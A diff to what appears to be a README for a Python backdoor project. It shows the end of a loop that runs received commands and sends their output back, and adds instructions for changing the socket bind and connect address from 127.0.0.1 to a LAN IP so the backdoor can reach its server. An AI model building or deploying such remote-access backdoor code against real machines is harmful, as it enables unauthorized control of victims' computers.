@@ -31,3 +31,19 @@ result = execute.stdout.read() + execute.stderr.read()
 reliable_send(result)
 ```
 ![Ekran Alıntısı](https://user-images.githubusercontent.com/69467096/112891291-a4fc3c00-90e0-11eb-81bd-604dd01c9b0d.PNG)
+### due to some complications in server.py and backdoor.py You must replace the code blocks that write 127.0.0.1 with the local IP address.
+# LIKE THIS
+
+```python
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sck.bind(('127.0.0.1',5555))
+
+s.connect(('127.0.0.1',5555))
+```
+# TO THIS
+```python
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sck.bind(('192.1.2.12',5555))
+
+s.connect(('192.1.2.12',5555))
+```
